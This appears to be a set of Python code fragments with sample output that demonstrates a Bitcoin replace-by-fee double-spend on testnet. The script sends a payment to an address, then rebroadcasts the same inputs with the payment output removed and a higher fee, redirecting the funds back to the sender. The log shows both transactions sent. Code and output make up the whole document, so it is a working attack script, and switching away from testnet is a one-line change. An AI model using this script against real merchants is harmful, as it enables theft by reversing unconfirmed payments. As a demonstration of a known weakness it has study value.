["```\nfrom bitcoin import SelectParams \nimport bitcoin.rpc \nimport math \nimport time \n\nfrom bitcoin.core import b2x, b2lx, str_money_value, COIN, \nCMutableTransaction, CMutableTxIn, CMutableTxOut \nfrom bitcoin.wallet import CBitcoinAddress \n```", "```\nSelectParams('testnet') \n\nrpc = bitcoin.rpc.Proxy() \n```", "```\ndust_amount = int(0.0001 * COIN) \n\nfeeperbyte1 = 0.000011 / 1000 * COIN \nfeeperbyte2 = 0.001 / 1000 * COIN \n```", "```\noptinrbf = True \ntx1_nSequence = 0xFFFFFFFF-2 if optinrbf else 0xFFFFFFFF \ntx2_nSequence = tx1_nSequence \n```", "```\npayment_address = CBitcoinAddress(\"n4Wux6bCxwFPvj7BYNb8REvtahhJ9fHJFv\") \npayment_txout = CMutableTxOut(int(0.1 * COIN), \npayment_address.to_scriptPubKey()) \nchange_txout = CMutableTxOut(0, \nrpc.getnewaddress().to_scriptPubKey()) \n\ntx = CMutableTransaction() \ntx.vout.append(change_txout) \ntx.vout.append(payment_txout) \n```", "```\nvalue_in = 0 \nvalue_out = sum([vout.nValue for vout in tx.vout]) \nunspent = sorted(rpc.listunspent(1), key=lambda x: x['amount']) \nwhile (value_in - value_out) / len(tx.serialize()) < feeperbyte1: \n\n    delta_fee = math.ceil((feeperbyte1 * len(tx.serialize())) - (value_in - value_out)) \n\n    if change_txout.nValue - delta_fee > dust_amount: \n        change_txout.nValue -= delta_fee \n        value_out -= delta_fee \n```", "```\n    if value_in - value_out < 0: \n        new_outpoint = unspent[-1]['outpoint'] \n        new_amount = unspent[-1]['amount'] \n        unspent = unspent[:-1] \n\n        print('Adding new input %s:%d with value %s BTC' % \\ \n        (b2lx(new_outpoint.hash), new_outpoint.n, \n        str_money_value(new_amount))) \n\n        new_txin = CMutableTxIn(new_outpoint, nSequence=tx1_nSequence)\n         tx.vin.append(new_txin) \n\n        value_in += new_amount \n        change_txout.nValue += new_amount \n        value_out += new_amount \n\n        r = rpc.signrawtransaction(tx) \n        assert(r['complete']) \n\n        tx.vin[-1].scriptSig = r['tx'].vin[-1].scriptSig \n```", "```\nr = rpc.signrawtransaction(tx) \nassert(r['complete']) \ntx = CMutableTransaction.from_tx(r['tx']) \n\nprint('Payment raw transaction %s' % b2x(tx.serialize())) \nprint('Payment raw transaction size: %.3f KB, fees: %s, %s BTC/KB' % \\ \n             (len(tx.serialize()) / 1000, \n              str_money_value(value_in-value_out), \n              str_money_value((value_in-value_out) / len(tx.serialize()) * 1000))) \n\ntxid = rpc.sendrawtransaction(tx) \nprint('Sent payment with txid: %s' % b2lx(txid)) \n```", "```\ntx.vout = tx.vout[0:1] \nchange_txout = tx.vout[0] \nvalue_out = value_in \nchange_txout.nValue = value_out \n\nwhile (value_in - value_out) / len(tx.serialize()) < feeperbyte2: \n    delta_fee = math.ceil((feeperbyte2 * len(tx.serialize())) - (value_in - value_out)) \n\n    if change_txout.nValue - delta_fee > dust_amount: \n        change_txout.nValue -= delta_fee \n        value_out -= delta_fee \n\n    if value_in - value_out < 0: \n        new_outpoint = unspent[-1]['outpoint'] \n        new_amount = unspent[-1]['amount'] \n        unspent = unspent[:-1] \n\n        print('Adding new input %s:%d with value %s BTC' % \\\n         (b2lx(new_outpoint.hash), new_outpoint.n,\n         str_money_value(new_amount))) \n\n        new_txin = CMutableTxIn(new_outpoint, nSequence=tx2_nSequence) \n        tx.vin.append(new_txin) \n\n        value_in += new_amount \n        change_txout.nValue += new_amount \n        value_out += new_amount \n\n        r = rpc.signrawtransaction(tx) \n        assert(r['complete']) \n        tx.vin[-1].scriptSig = r['tx'].vin[-1].scriptSig \n```", "```\nr = rpc.signrawtransaction(tx) \nassert(r['complete']) \ntx = r['tx'] \n\nprint('Double-spend raw transaction %s' % b2x(tx.serialize())) \nprint('Double-spend raw transaction size: %.3f KB, fees: %s, %s BTC/KB' % \\ \n            (len(tx.serialize()) / 1000,\n              str_money_value(value_in-value_out),\n              str_money_value((value_in-value_out) / len(tx.serialize()) * 1000))) \n\ntxid = rpc.sendrawtransaction(tx) \nprint('Sent double-spend txid: %s' % b2lx(txid)) \n```", "```\nAdding new input 727ae80da7fc81db0304af0324907cb28d32666a6cc8a5813021ec8350a8e05f:0 \nwith value 0.799808 BTC \nPayment raw transaction \n01000000015fe0a85083ec213081a5c86c6a66328db27c902403af0403db81fca70de87... \nPayment raw transaction size: 0.225 KB, fees: 0.00000249, 0.00001106 BTC/KB \nSent payment with txid: f52961ddb5881c4f5a10ca3625c978997ed46dd03da0787acb8f26e36e5e686f \n\nWaiting for 2 seconds before double spending \nDouble-spend raw transaction \n01000000015fe0a85083ec213081a5c86c6a66328db27c902403af0403db81fca70de87... \nDouble-spend raw transaction size: 0.191 KB, fees: 0.000191, \n0.00099479 BTC/KB \nSent double-spend txid: \n8660fc74668ea2e1fe32d2381c8f6b2512e4418677b63cecab8d7f66b5a162a4 \n```"]